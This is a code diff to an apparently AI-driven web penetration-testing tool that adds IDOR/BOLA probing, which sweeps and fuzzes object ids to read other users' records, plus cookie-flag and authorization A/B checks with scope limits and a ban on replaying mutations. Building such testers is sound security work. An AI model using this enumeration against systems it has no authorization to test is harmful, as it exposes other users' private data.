-          deterministicVerdict = `unstable, not confirmed — the two authed GETs returned different statuses (${g1.status} vs ${g2.status}). Re-run analyze_session before recording anything.`;
+        } else if (p1.status !== p2.status) {
+          deterministicVerdict = `unstable, not confirmed — the two authed GETs returned different statuses (${p1.status} vs ${p2.status}). Re-run analyze_session before recording anything.`;
+        } else if (!positivesOk) {
+          deterministicVerdict = `unverified, not confirmed — the authed GETs did not both return a valid application response (statuses ${p1.status} / ${p2.status}; a login wall, redirect, or error page means the session died mid-run). Re-run analyze_session on a live session before recording anything.`;
         } else {
-          const audit = auditSessionCookieFlags({
-            setCookie,
+          const auditArgs = {
             requestCookieNames: parseCookieHeader(cookieHeader).map((c) => c.name),
             url: pageUrl,
             jar,
-          });
-          deterministic = audit.findings.map((f) => ({ ...f, evidenceIds }));
-          if (audit.sessionCookies.length === 0)
+          };
+          const audit1 = auditSessionCookieFlags({ setCookie, ...auditArgs });
+          const setCookie2 = p2.headers["set-cookie"] ?? p2.headers["Set-Cookie"] ?? "";
+          const audit2 = auditSessionCookieFlags({ setCookie: setCookie2, ...auditArgs });
+          // A flag finding is real only when BOTH authed replays show the same attribute missing on the same cookie.
+          const keys2 = new Set(audit2.findings.map((f) => `${f.key}${f.cookieName}`));
+          deterministic = audit1.findings.filter((f) => keys2.has(`${f.key}${f.cookieName}`)).map((f) => ({ ...f, evidenceIds }));
+          if (audit1.sessionCookies.length === 0)
             deterministicNotes.push(
               "no session cookie identified (name must match sess|sid|auth|token|jwt|remember, excluding locale/lang/theme/currency/tz/timezone/csrf/xsrf/_ga/_gid/consent/style/ui noise). Bearer/JWT-only session → probe_jwt for token weaknesses.",
             );
-          deterministicNotes.push(...audit.unknown);
-          deterministicVerdict =
-            deterministic.length === 0
-              ? "no deterministic session-cookie flag findings (Secure/HttpOnly/SameSite/Domain-scope are checked on the session cookie only)."
-              : `SESSION COOKIE FLAG FINDINGS — ${deterministic.map((f) => `${f.cookieName}: ${f.key}`).join(", ")}. record_finding(category session, param=<key>) for each, citing these evidenceIds (absence class: no control differential required, like probe_headers).`;
+          deterministicNotes.push(...audit1.unknown);
+          if (deterministic.length === 0) {
+            deterministicVerdict =
+              "no deterministic session-cookie flag findings (Secure/HttpOnly/SameSite/Domain-scope are checked on the session cookie only).";
+          } else if (!ctrlDenied) {
+            deterministicVerdict =
+              `UNVERIFIED cookie-flag observation — ${deterministic.map((f) => `${f.cookieName}: ${f.key}`).join(", ")} missing on BOTH authed GETs, but the unauthenticated control also reached the page (status ${ctrl.status}), so no independent failing control could be established and record_finding must reject a confirmed claim. File verdict:"suspected" citing observation:"${p1.evId}" + an anomaly, or skip.`;
+          } else {
+            confirmable = true;
+            deterministicVerdict =
+              `SESSION COOKIE FLAG FINDINGS — ${deterministic.map((f) => `${f.cookieName}: ${f.key}`).join(", ")}. record_finding(category session, param=<key>) for each, citing negativeControl:"${ctrl.evId}" + positiveReplays:["${p1.evId}","${p2.evId}"] (independent denied control + 2 stable authed replays — each is a distinct evidenceId).`;
+          }
         }
+        s.sessionFlagUnverified = deterministic.length > 0 && !confirmable;
         return txt(
           JSON.stringify({
-            evidenceId: g2.evId,
-            negativeControl: g1.evId,
-            positiveReplays: evidenceIds,
+            evidenceId: p2.evId,
+            observation: p1.evId,
+            ...(evidenceShape ? { negativeControl: ctrl.evId, positiveReplays: evidenceIds } : { flagEvidenceIds: evidenceIds, unauthControl: ctrl.evId }),
             currentRole: s.currentRole || "unauth",
             requestDump: formatRequestDump("GET", pageUrl, cookieHeader, authorization),
-            response: { status: g1.status, setCookie: setCookie || undefined },
+            response: { status: p1.status, setCookie: setCookie || undefined },
             cookies,
             ...(bearerJwt ? { bearerJwt } : {}),
             hints,
@@ -4510,7 +6714,8 @@ export function buildTools(s: PilotSession) {
         if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
         let rUnauth: HttpResponse;
         try {
-          rUnauth = await s.http.send({ method: "GET", url, headers: {}, body: null });
+          // Truly anonymous: inherited defaults (Basic auth, operator custom headers) must not ride along.
+          rUnauth = await s.http.send({ method: "GET", url, headers: {}, body: null, inheritDefaultHeaders: false });
           bumpHttp(s, rUnauth.status);
         } catch (e) {
           return txt(`ERROR (unauth): ${String(e).slice(0, 150)}`);
@@ -4529,7 +6734,7 @@ export function buildTools(s: PilotSession) {
             screenId: s.currentScreenId ?? "pilot",
             validator: "verify_access",
             kind: "negative_control",
-            request: { method: "GET", url, headers: s.http.effectiveHeaders({}), body: null },
+            request: { method: "GET", url, headers: s.http.effectiveHeaders({}, false), body: null },
             response: rUnauth,
             note: "unauthenticated access attempt",
           }).id,
@@ -4551,6 +6756,15 @@ export function buildTools(s: PilotSession) {
           rAuth ? { status: rAuth.status, body: rAuth.body } : null,
         );
         s.accessVerdicts.set(normEndpoint(url, s.targetUrl), verdict); // record_finding の硬い gate 用
+        recordCheck(s, {
+          tool: "verify_access",
+          checkClass: "auth-bypass",
+          target: checkTargetOf("GET", url, s.targetUrl),
+          url,
+          status: verdict === "needs_judgment" ? "suspected" : verdict === "not_bypass" ? "tested-clean" : "unverified",
+          reason,
+          evidenceIds: evIds,
+        });
         const gray = verdict === "needs_judgment";
         return txt(
           JSON.stringify({
@@ -4569,15 +6783,18 @@ export function buildTools(s: PilotSession) {
 
     tool(
       "probe_idor",
-      "Confirm IDOR / BOLA mechanically. As YOUR current session, try to reach ANOTHER user's object. BEST DEFAULT: OMIT param/header/{{ID}} and the tool SWEEPS every id-bearing field on the current screen — each in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids seen elsewhere (knownObjectIds). This is the fix for 'IDOR filed suspected because only one param was tried': one call now covers ALL id fields, so you can't miss the hole by naming the wrong param. `selfId` = an id you legitimately own (OPTIONAL in sweep mode — taken per-field from the inventory). `victimId` = another user's id — OPTIONAL: omit to FUZZ neighbouring ids (selfId±1, ±2, low/seed 1/2/1000) and auto-discover another user's object with no second account. To test ONE specific field, pin it: a {{ID}} placeholder in url/body, `param` (query), or `header` (X-User-Id-style BOLA). Sends a NON-EXISTENT id (negative control — must 404/deny), then the victim/neighbour id (2nd stable replay once it looks real); confirms ONLY on cross-user PRIVATE data (email/phone/address/extra internal id, or order/basket/message contents — NOT a tenant people-picker/profile directory (displayName + work email + photo + tenant is typically intended)) and stable. Opaque uuid/hash ids can't be enumerated → get a real victim id. On a sweep that finds a POPULATED-but-unprovable PRIVATE object it tells you (that is the ONLY case where verdict:suspected is legitimate — a real observed anomaly); a public profile card is CLEAN, not suspected. Returns negativeControl + positiveReplays evidenceIds + cross-user impact → record_finding(category idor, or idor-write for a mutating method).",
+      "Confirm IDOR / BOLA mechanically. As YOUR current session, try to reach ANOTHER user's object. BEST DEFAULT: OMIT param/header/{{ID}} and the tool SWEEPS every id-bearing field on the current screen — each in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids seen elsewhere (knownObjectIds). This is the fix for 'IDOR filed suspected because only one param was tried': one call now covers ALL id fields, so you can't miss the hole by naming the wrong param. `selfId` = an id you legitimately own (OPTIONAL in sweep mode — taken per-field from the inventory). `victimId` = another user's id — OPTIONAL: omit to FUZZ neighbouring ids (selfId±1, ±2, low/seed 1/2/1000) and auto-discover another user's object with no second account. To test ONE specific field, pin it: a {{ID}} placeholder in url/body, `param` (query), or `header` (X-User-Id-style BOLA). Sends a NON-EXISTENT id (negative control — must 404/deny), then the victim/neighbour id (2nd stable replay once it looks real); confirms ONLY on cross-user PRIVATE data (email/phone/address/extra internal id, or order/basket/message contents — NOT a tenant people-picker/profile directory (displayName + work email + photo + tenant is typically intended)) and stable. Opaque uuid/hash ids can't be enumerated → get a real victim id. On a sweep that finds a POPULATED-but-unprovable PRIVATE object it tells you (that is the ONLY case where verdict:suspected is legitimate — a real observed anomaly); a public profile card is CLEAN, not suspected. Returns negativeControl + positiveReplays evidenceIds + cross-user impact. A CROSS-USER READ OBSERVED result is a strong LEAD — to CONFIRM a finding you must then run probe_authz with the victim's ownerRole (verified ownership + denied control + stable replays is what record_finding(idor) accepts); if no owner can be established, record verdict:'suspected'.",
       { url: z.string(), selfId: z.string().optional(), victimId: z.string().optional(), param: z.string().optional(), header: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
       async ({ url, selfId, victimId, param, header, method, body }) => {
         type PlaceLoc = IdParamLoc | { via: "body-ph" } | { via: "url-ph" };
+        /** Per-field request template — GraphQL sweep fields carry their own (their op's endpoint+body); a plain
+         *  param sweep uses the caller's url/method/body. */
+        type ReqTemplate = { url: string; method?: string; body?: string | null; headers?: Record<string, string> };
         // Place a fuzzed id into ONE location (a specific field), so the same discipline runs across every id-bearing field.
-        const buildReqAt = (idVal: string, loc: PlaceLoc): HttpRequest | null => {
-          let u = url;
-          let b: string | null = body ?? null;
-          const h: Record<string, string> = { ...authHeaders(s) };
+        const buildReqAt = (idVal: string, loc: PlaceLoc, tmpl?: ReqTemplate): HttpRequest | null => {
+          let u = tmpl?.url ?? url;
+          let b: string | null = tmpl ? (tmpl.body ?? null) : body ?? null;
+          const h: Record<string, string> = { ...authHeaders(s), ...(tmpl?.headers ?? {}) };
           switch (loc.via) {
             case "header":
               h[loc.name] = idVal;
@@ -4594,6 +6811,26 @@ export function buildTools(s: PilotSession) {
             case "body-field":
               b = setFormField(b, loc.name, idVal);
               break;
+            case "json-field": {
+              // Nested JSON body field (GraphQL variables.input.ownerId, a nested REST JSON body). The pointer must
+              // already exist (replace-only) and the new value is coerced to the leaf's JSON kind — a type-mismatched
+              // variable would be rejected by the schema, not prove a vuln. Content-type becomes JSON.
+              let obj: unknown;
+              try {
+                obj = JSON.parse(b ?? "");
+              } catch {
+                return null;
+              }
+              if (!obj || typeof obj !== "object") return null;
+              const leaf = readJsonPath(obj, loc.pointer);
+              if (!leaf.found) return null;
+              const rec = obj as Record<string, unknown>;
+              if (!writeJsonPath(Array.isArray(rec) ? rec : rec, loc.pointer, coerceJsonLike(leaf.value, idVal))) return null;
+              b = JSON.stringify(obj);
+              const lc = "content-type";
+              if (!Object.keys(h).some((k) => k.toLowerCase() === lc)) h[lc] = "application/json";
+              break;
+            }
             case "body-ph":
               if (b == null || !b.includes("{{ID}}")) return null;
               b = b.replace(/\{\{ID\}\}/g, idVal);
@@ -4610,49 +6847,79 @@ export function buildTools(s: PilotSession) {
             }
           }
           if (!isInScope(u, s.scope)) return null;
-          return { method: (method ?? (b != null ? "POST" : "GET")).toUpperCase(), url: u, headers: h, body: b };
+          return { method: ((tmpl?.method ?? method) ?? (b != null ? "POST" : "GET")).toUpperCase(), url: u, headers: h, body: b };
         };
-        const send = async (idVal: string, kind: "negative_control" | "positive_replay", tag: string, loc: PlaceLoc) => {
-          const req = buildReqAt(idVal, loc);
+        const send = async (idVal: string, kind: "negative_control" | "positive_replay", tag: string, loc: PlaceLoc, tmpl?: ReqTemplate) => {
+          const req = buildReqAt(idVal, loc, tmpl);
           if (!req) return null;
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-idor", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `idor ${tag}` });
-          return { evId: ev.id, status: res.status, len: res.body.length, body: res.body };
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-idor", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `idor ${tag}` });
+          return { evId: ev.id, status: res.status, len: res.body.length, body: res.body, gql: parseGraphqlResponse(res.status, res.body) };
         };
         type Sent = NonNullable<Awaited<ReturnType<typeof send>>>;
+        /** GraphQL semantics: HTTP 200 can still be a DENIAL ({errors:[FORBIDDEN]}) or a null result — count access as
+         *  real only when data actually came back. REST/非GraphQL bodies keep the status-only check. */
+        const gqlAccessible = (r: Sent): boolean =>
+          r.gql.kind === "not-graphql" ? r.status < 400 : r.gql.kind === "ok" || r.gql.kind === "partial";
         // Evaluate one candidate victim/neighbour id against a shared control: cross-user object present + control (a
         // non-existent id) denied + stable x2. `self` = the id this session legitimately owns (for the impact oracle).
-        const evalVictim = async (vid: string, ctrl: Sent, label: string, loc: PlaceLoc, self: string) => {
-          const p1 = await send(vid, "positive_replay", `${label} #1`, loc);
+        const evalVictim = async (vid: string, ctrl: Sent, label: string, loc: PlaceLoc, self: string, tmpl?: ReqTemplate) => {
+          const p1 = await send(vid, "positive_replay", `${label} #1`, loc, tmpl);
           if (!p1) return null;
-          const accessible = p1.status < 400;
+          const accessible = gqlAccessible(p1);
           const impact = impactOracle(p1.body, { requestedIdentity: vid, sessionIdentity: self, baselineBody: ctrl.body });
           const bodyClass = classifyCrossUserBody(p1.body, vid);
           // Trust the oracle (victim id + not a public-directory card). Do not fall back to a bare identityAppears —
           // that is what confirmed display-name-only profiles as IDOR.
           const crossUser = impact.some((i) => i.kind === "cross-user");
           const publicDirectory = bodyClass.class === "public-directory" && identityAppears(p1.body, vid) && (!self || !identityAppears(p1.body, self));
-          const controlDenied = ctrl.status >= 400 || Math.abs(ctrl.len - p1.len) > 64 || !ctrl.body.includes(vid);
+          const controlDenied = ctrl.status >= 400 || Math.abs(ctrl.len - p1.len) > 64 || !ctrl.body.includes(vid) || (ctrl.gql.kind !== "not-graphql" && !gqlAccessible(ctrl));
           let p2: Sent | null = null;
           let stable = false;
           if (accessible && crossUser && controlDenied) {
-            p2 = await send(vid, "positive_replay", `${label} #2`, loc);
+            p2 = await send(vid, "positive_replay", `${label} #2`, loc, tmpl);
             stable = !!p2 && Math.abs(p1.len - p2.len) <= 64 && p1.status === p2.status;
           }
           return { vid, p1, p2, confirmed: accessible && crossUser && controlDenied && stable, accessible, crossUser, publicDirectory, controlDenied, stable, impact, bodyClass: bodyClass.class };
         };
-        const cat = (method ?? "GET").toUpperCase() === "GET" ? "idor" : "idor-write";
+        // probe_idor only ever READS — even a POST body is replayed to fetch an object, never to prove a
+        // mutation. A POST-read is `idor`, NOT `idor-write`; write coverage requires probe_authz(action:"write")
+        // (or probe_graphql_op's mutation verify) where a mutating effect is actually attributed.
         // Where the caller pinned the id (single-field mode). null → SWEEP every id-bearing field on the screen.
+        // `param` doubles as a nested-JSON selector: "json:<path>" / any path with a dot or slash against a JSON
+        // body (GraphQL "variables.input.ownerId", REST nested bodies) → json-field; a bare name stays a query param.
+        const jsonPointer = (() => {
+          if (!param) return null;
+          const spec = param.startsWith("json:") ? param.slice(5) : param;
+          if (spec === param && !/[./]/.test(spec)) return null; // bare name without the json: prefix = query param
+          try {
+            const o = JSON.parse(body ?? "");
+            return o && typeof o === "object" ? spec : null;
+          } catch {
+            return null;
+          }
+        })();
         const explicitLoc: PlaceLoc | null = header
           ? { via: "header", name: header }
           : body != null && body.includes("{{ID}}")
             ? { via: "body-ph" }
             : param
-              ? { via: "query", name: param }
+              ? jsonPointer
+                ? { via: "json-field", pointer: jsonPointer }
+                : { via: "query", name: param }
               : url.includes("{{ID}}")
                 ? { via: "url-ph" }
                 : null;
+        // An explicitly pinned request can still be a GraphQL mutation (param:"json:variables.input.ownerId"
+        // against a mutation document). probe_idor NEVER replays mutations — observed or hand-built — because
+        // an id swap on a write op can transfer/delete another user's object. Mutation coverage lives in
+        // probe_graphql_op behind its explicit opt-in + verifyQuery gate.
+        if (explicitLoc && body) {
+          const pinned = describeGraphqlOperation(body);
+          if (pinned?.operationType === "mutation")
+            return txt(`ERROR: the pinned request is a GraphQL mutation (${pinned.operationName ?? pinned.rootFields.join(",")}) — probe_idor does not replay mutations. Use probe_graphql_op with mutationAck + verifyQuery on an authorized test resource instead.`);
+        }
         try {
           // ── Explicit victim id ── (a second account / a known other-user id was supplied)
           if (explicitLoc && victimId) {
@@ -4669,7 +6936,7 @@ export function buildTools(s: PilotSession) {
                 ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
                 observed: { control: { status: ctrl.status, len: ctrl.len }, victim: { status: r.p1.status, len: r.p1.len }, crossUser: r.crossUser, controlDenied: r.controlDenied, stable: r.stable },
                 verdict: r.confirmed
-                  ? `IDOR/BOLA CONFIRMED — your session read victim ${victimId}'s object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control status ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`
+                  ? `CROSS-USER READ OBSERVED — your session read victim ${victimId}'s object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control status ${ctrl.status}). To CONFIRM: run probe_authz(url, objectId:"${victimId}", ownerRole:<the victim's role>, compareRole:<your role>) — verified ownership + a denied control + stable replays is what record_finding accepts. If no owner can be established, record verdict:"suspected" instead.`
                   : !r.accessible
                     ? `not IDOR: the victim object returned ${r.p1.status} (access control appears to hold).`
                     : !r.crossUser
@@ -4706,7 +6973,7 @@ export function buildTools(s: PilotSession) {
                     negativeControl: ctrl.evId,
                     positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                     ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
-                    verdict: `IDOR/BOLA CONFIRMED via id enumeration — neighbour id ${vid} returned another user's object (status ${r.p1.status}, cross-user data) while a non-existent id was denied (control ${ctrl.status}). No second account needed. record_finding(category ${cat}) with these evidenceIds.`,
+                    verdict: `CROSS-USER READ OBSERVED via id enumeration — neighbour id ${vid} returned another user's object (status ${r.p1.status}, cross-user data) while a non-existent id was denied (control ${ctrl.status}). To CONFIRM: run probe_authz(url, objectId:"${vid}", ownerRole:<the victim's role>, compareRole:<your role>) — record_finding(idor) requires its 'unexpected-access' comparison. If no owner can be established, record verdict:"suspected".`,
                   }),
                 );
             }
@@ -4726,13 +6993,21 @@ export function buildTools(s: PilotSession) {
               }),
             );
           }
-          // ── SWEEP mode ── no location pinned → deterministically test EVERY id-bearing field the screen exposes, each
-          //    in its OWN location (query/body/header/path), seeded from its observed value + real other-user ids.
+          // ── SWEEP mode — no location pinned → test EVERY id-bearing field on the screen, each in its OWN
+          // location (query/body/header/path AND GraphQL operation variables — a POST /graphql op's nested
+          // variables.input.ownerId is swept by its own request template, so the op itself is replayed).
+          // GraphQL MUTATION operations are excluded here BY POLICY: observing a delete/transfer op never
+          // authorizes replaying it, and a swept neighbour id into a write op is not a safe test. Mutation
+          // coverage goes through probe_graphql_op (explicit opt-in + verifyQuery on a test resource).
           const sc = s.inv.screens().find((x) => x.screenId === s.currentScreenId);
-          const fields = idBearingParamLocs(sc?.params ?? []).slice(0, 8);
+          const gqlFields = graphqlIdParamLocs(sc?.apis ?? [], s.targetUrl).filter((f) => !f.write);
+          const fields: Array<{ name: string; example: string; loc: IdParamLoc; write?: boolean; req?: ReqTemplate }> = [
+            ...idBearingParamLocs(sc?.params ?? []),
+            ...gqlFields.map((f) => ({ ...f, req: { ...f.req, headers: { "content-type": "application/json" } } })),
+          ].slice(0, 8);
           if (fields.length === 0)
             return txt(
-              `SWEEP NOT POSSIBLE: this screen exposes no id-bearing parameter. Point probe_idor at a specific id — a {{ID}} placeholder in url/body, a query 'param', or a 'header' (e.g. X-User-Id) — with selfId = an id you own.`,
+              `SWEEP NOT POSSIBLE: this screen exposes no id-bearing parameter. Point probe_idor at a specific id — a {{ID}} placeholder in url/body, a query 'param', a JSON 'param:"json:variables.input.ownerId"', or a 'header' (e.g. X-User-Id) — with selfId = an id you own.`,
             );
           const known = knownObjectIds(s);
           const victimsFor = (name: string): string[] => known.filter((k) => k.startsWith(`${name}=`)).map((k) => k.slice(name.length + 1)).slice(0, 4);
@@ -4745,7 +7020,7 @@ export function buildTools(s: PilotSession) {
               swept.push({ param: f.name, via: f.loc.via, tried: [], populated: [] });
               continue;
             }
-            const ctrl = await send(nonexistentIdLike(self), "negative_control", `non-existent ${f.name}`, f.loc);
+            const ctrl = await send(nonexistentIdLike(self), "negative_control", `non-existent ${f.name}`, f.loc, f.req);
             if (!ctrl) {
               swept.push({ param: f.name, via: f.loc.via, tried: [], populated: [] });
               continue;
@@ -4753,7 +7028,7 @@ export function buildTools(s: PilotSession) {
             const populated: Array<{ id: string; evId: string; status: number }> = [];
             let directory = false;
             for (const vid of candidates) {
-              const r = await evalVictim(vid, ctrl, `${f.name}=${vid}`, f.loc, self);
+              const r = await evalVictim(vid, ctrl, `${f.name}=${vid}`, f.loc, self, f.req);
               if (!r) continue;
               if (r.confirmed)
                 return txt(
@@ -4766,11 +7041,11 @@ export function buildTools(s: PilotSession) {
                     negativeControl: ctrl.evId,
                     positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                     ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
-                    verdict: `IDOR/BOLA CONFIRMED by sweep — the '${f.name}' ${f.loc.via} field is object-scoped: id ${vid} returned another user's object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`,
+                    verdict: `CROSS-USER READ OBSERVED by sweep — the '${f.name}' ${f.loc.via} field is object-scoped: id ${vid} returned another user's object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control ${ctrl.status}). To CONFIRM: run probe_authz(url, objectId:"${vid}", ownerRole:<the victim's role>, compareRole:<your role>) — record_finding(idor) requires its 'unexpected-access' comparison. If no owner can be established, record verdict:"suspected".`,
                   }),
                 );
               if (r.publicDirectory) directory = true;
-              else if (r.p1.status < 400 && Math.abs(r.p1.len - ctrl.len) > 64) populated.push({ id: vid, evId: r.p1.evId, status: r.p1.status });
+              else if (r.accessible && Math.abs(r.p1.len - ctrl.len) > 64) populated.push({ id: vid, evId: r.p1.evId, status: r.p1.status });
             }
             swept.push({ param: f.name, via: f.loc.via, control: ctrl.evId, tried: candidates, populated, ...(directory ? { directory: true } : {}) });
           }
@@ -4795,6 +7070,630 @@ export function buildTools(s: PilotSession) {
       },
     ),
 
+    // ───────────────────────── evidence-backed A/B authorization comparison ─────────────────────────
+    tool(
+      "probe_authz",
+      "Run a BOUNDED, evidence-backed A/B authorization test on ONE concrete object — the only path that can produce a CONFIRMABLE idor/idor-write finding. `ownerRole` = the subject that legitimately owns the object (its session sends the baseline read), `compareRole` = the non-owner/lower-privileged subject under test. The tool: establishes each role's principal (identityUrl when configured), reads the object AS THE OWNER (baseline must succeed and carry the object), sends a denied control (a non-existent id as the compare role — proves the endpoint discriminates), then replays the access AS THE COMPARE ROLE twice (stability). Confirms ONLY when: ownership is verified (owner field in the owner baseline binds to the owner's established principal — OR an operator expectedAccess rule), the compare principal is established and differs from the owner, the denied control actually denied, and both compare replays returned the private object. Everything else is recorded honestly: unexpected-looking access without verified ownership/expectation = 'inconclusive' (a LEAD, cite it as suspected at most); a missing/expired comparison session NEVER falls back to another session — the run is recorded 'unverified'/'blocked'. Same-principal A/B (two aliases for one account) is REJECTED. `objectId` must appear in `url` (path/query) or `body`; a {{ID}} placeholder is also accepted (the tool swaps objectId in). `action` 'write' marks the comparison a mutating test (idor-write) — use only for requests that actually mutate, a search/query POST is a READ.",
+      {
+        url: z.string(),
+        method: z.string().optional(),
+        body: z.string().nullable().optional(),
+        objectId: z.string().describe("the concrete object identifier under test (must appear in url or body, or use {{ID}})"),
+        resourceType: z.string().optional().describe("logical resource type label, e.g. 'order' — defaults to a guess from the url"),
+        param: z.string().optional().describe("the param carrying objectId (query name / json:path) — informational; the check row keys on it"),
+        ownerRole: z.string().describe("role that legitimately owns/reads this object (baseline leg)"),
+        compareRole: z.string().describe("the non-owner / lower-privileged role under test ('unauth' allowed = anonymous leg)"),
+        action: z.enum(["read", "write"]).optional(),
+        tenant: z.string().optional().describe("the object's tenant — only meaningful when operator-established (ignored for boundary claims otherwise)"),
+        note: z.string().optional(),
+      },
+      async ({ url, method, body, objectId, resourceType, param, ownerRole, compareRole, action, note }) => {
+        const m = (method ?? (body != null ? "POST" : "GET")).toUpperCase();
+        const act: "read" | "write" = action ?? "read";
+        const cls = act === "write" ? "idor-write" : "idor";
+        const endpoint = normEndpoint(url, s.targetUrl);
+        const rtype = resourceType || endpoint.split("/").filter(Boolean).slice(0, 2).join("/").replace(/[{}]/g, "") || "object";
+        const gqlDesc = describeGraphqlOperation(body);
+        const gqlOp = gqlDesc?.operationKey;
+        const gqlOpType = gqlDesc?.operationType;
+        const origin = webOriginOf(url, s.targetUrl);
+        const target = checkTargetOf(m, url, s.targetUrl, gqlOp);
+        // objectKey is assigned once the operator tenant context is known (origin+method+operation+tenant+id —
+        // same id under a different host/method/operation/tenant is a DIFFERENT object).
+        let objectKey = JSON.stringify([rtype, origin, target, "", objectId]);
+        let objectTenant: string | undefined;
+        // The compare role's effective session — stamped onto the check row, never the current session's.
+        let cmpSessionHeaders: Record<string, string> | undefined;
+        // Persist one comparison record no matter how it ends — the honest trail IS the point.
+        const finish = async (
+          outcome: "unexpected-access" | "denied-as-expected" | "allowed" | "inconclusive" | "unverified",
+          fields: {
+            ownerEvidenceId?: string;
+            identityEvidenceIds?: string[];
+            deniedEvidenceIds?: string[];
+            compareEvidenceIds?: string[];
+            expectation?: "deny" | "allow" | "unknown";
+            expectationBasis?: "operator" | "acl" | "observed-denial" | "none";
+            tenantBoundary?: boolean;
+            reason: string;
+            checkStatus: CheckStatus;
+            owner?: string;
+            ownerBasis?: "operator" | "identity-binding";
+          },
+        ): Promise<ReturnType<typeof txt>> => {
+          const cmpId = `azc-${Date.now().toString(36)}-${Math.floor(Math.random() * 1e6).toString(36)}`;
+          const ownerCtx = subjectCtx(s, ownerRole);
+          const cmpCtx = subjectCtx(s, compareRole);
+          s.store.recordAuthzComparison(s.assessmentId, {
+            id: cmpId,
+            objectKey,
+            endpoint,
+            action: act,
+            ownerSubject: ownerRole,
+            ownerPrincipal: ownerCtx.principal,
+            compareSubject: compareRole,
+            comparePrincipal: cmpCtx.principal,
+            ownerEvidenceId: fields.ownerEvidenceId,
+            identityEvidenceIds: fields.identityEvidenceIds ?? [],
+            deniedEvidenceIds: fields.deniedEvidenceIds ?? [],
+            compareEvidenceIds: fields.compareEvidenceIds ?? [],
+            expectation: fields.expectation ?? "unknown",
+            expectationBasis: fields.expectationBasis ?? "none",
+            tenantBoundary: fields.tenantBoundary ?? false,
+            outcome,
+            reason: fields.reason,
+            at: new Date().toISOString(),
+          });
+          recordCheck(s, {
+            tool: "probe_authz",
+            checkClass: cls,
+            target,
+            param,
+            resource: objectKey,
+            subject: compareRole,
+            sessionHeaders: cmpSessionHeaders,
+            url,
+            status: fields.checkStatus,
+            reason: fields.reason,
+            evidenceIds: [...(fields.ownerEvidenceId ? [fields.ownerEvidenceId] : []), ...(fields.deniedEvidenceIds ?? []), ...(fields.compareEvidenceIds ?? [])],
+            detail: `comparison ${cmpId}: ${outcome}`,
+          });
+          return txt(
+            JSON.stringify({
+              comparisonId: cmpId,
+              outcome,
+              reason: fields.reason,
+              object: { key: objectKey, type: rtype, id: objectId, endpoint, tenant: objectTenant ?? null },
+              subjects: { owner: { role: ownerRole, principal: ownerCtx.principal ?? null }, compare: { role: compareRole, principal: cmpCtx.principal ?? null } },
+              expectation: { value: fields.expectation ?? "unknown", basis: fields.expectationBasis ?? "none" },
+              evidence: { owner: fields.ownerEvidenceId ?? null, deniedControl: fields.deniedEvidenceIds ?? [], compareReplays: fields.compareEvidenceIds ?? [] },
+              ...(outcome === "unexpected-access"
+                ? { verdict: `UNEXPECTED ACCESS CONFIRMED — '${compareRole}' reached '${ownerRole}'s ${rtype} ${objectId} (verified owner, denied control held, stable replays). record_finding(category ${cls}, endpoint ${endpoint}) citing these evidenceIds.` }
+                : outcome === "inconclusive"
+                  ? { verdict: `INCONCLUSIVE — access observed but ownership/expectation is unproven (${fields.reason}). This is a LEAD, not a finding: record verdict:"suspected" at most, or establish ownership (identityUrl / operator expectedAccess) and re-run.` }
+                  : outcome === "denied-as-expected"
+                    ? { verdict: `DENIED AS EXPECTED — '${compareRole}' could not read ${rtype} ${objectId}. This exact comparison is clean.` }
+                    : outcome === "allowed"
+                      ? { verdict: `ALLOWED — access expected for '${compareRole}' (shared/public object or operator-declared allow). Not an IDOR.` }
+                      : { verdict: `UNVERIFIED — ${fields.reason}` }),
+            }),
+          );
+        };
+
+        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
+        if (ownerRole === compareRole)
+          return finish("unverified", { reason: "ownerRole === compareRole — an A/B test needs two distinct subjects", checkStatus: "unverified" });
+        // A write label is not a mutation contract: there is no independent before/after state verifier and no
+        // mutation safety gate, so a relabelled request would bypass the GraphQL mutation no-send protections.
+        // Refuse WITHOUT sending — a POST that only reads is action:'read'. Equally, action:'read' can never
+        // authorize mutating traffic: DELETE/PUT/PATCH methods and GraphQL mutation documents are refused the
+        // same way — BEFORE a single request leaves.
+        if (act === "write")
+          return finish("unverified", {
+            reason: "action:'write' is unsupported — mutating authorization checks need a bounded mutation contract + independent state verification (not implemented); nothing was sent. Read-only POSTs stay action:'read' (idor, not idor-write).",
+            checkStatus: "blocked",
+          });
+        if (/^(DELETE|PUT|PATCH)$/i.test(m) || gqlOpType === "mutation")
+          return finish("unverified", {
+            reason: `action:'read' cannot authorize mutating traffic (${gqlOpType === "mutation" ? "a GraphQL mutation document" : `method ${m}`}) — nothing was sent. A read comparison only ever issues GET/HEAD/POST-query legs.`,
+            checkStatus: "blocked",
+          });
+
+        // ── sessions (never fall back: a missing compare session must not silently become the owner's) ──
+        const ownerH = (await roleAuthHeaders(s, ownerRole)) ?? (ownerRole === s.currentRole ? authHeaders(s) : null);
+        const cmpH = (await roleAuthHeaders(s, compareRole)) ?? (compareRole === s.currentRole ? authHeaders(s) : null);
+        if (ownerH === null)
